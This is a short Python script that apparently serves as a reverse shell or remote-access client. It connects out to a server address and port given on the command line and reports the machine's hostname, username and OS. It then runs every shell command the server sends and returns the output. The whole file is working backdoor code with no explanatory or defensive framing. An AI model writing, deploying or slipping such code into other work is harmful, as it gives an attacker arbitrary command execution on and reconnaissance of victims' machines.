#!/usr/bin/env python3
import socket
import sys
import platform
import getpass
import json
import subprocess

def get_system_info():
    return {
        "hostname": platform.node(),
        "username": getpass.getuser(),
        "os": f"{platform.system()} {platform.release()}"
    }

def main():
    if len(sys.argv) != 3:
        print(f"Usage: python {sys.argv[0]} <server_ip> <port>")
        sys.exit(1)

    server_ip = sys.argv[1]
    port = int(sys.argv[2])

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((server_ip, port))
        # Send initial info
        init_data = json.dumps({"type": "init", "data": get_system_info()})
        s.send(init_data.encode() + b'\n')

        while True:
            data = s.recv(4096)
            if not data:
                break
            for line in data.split(b'\n'):
                if not line.strip():
                    continue
                msg = json.loads(line.decode())
                if msg["type"] == "run-command":
                    cmd = msg["command"]
                    try:
                        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                        output = result.decode(errors='ignore')
                    except subprocess.CalledProcessError as e:
                        output = e.output.decode(errors='ignore')
                    s.send(json.dumps({"type": "command-output", "data": output}).encode() + b'\n')
                elif msg["type"] == "exit":
                    s.close()
                    sys.exit(0)

    except Exception as e:
        print("Connection error:", e)
        sys.exit(1)

if __name__ == "__main__":
    main()
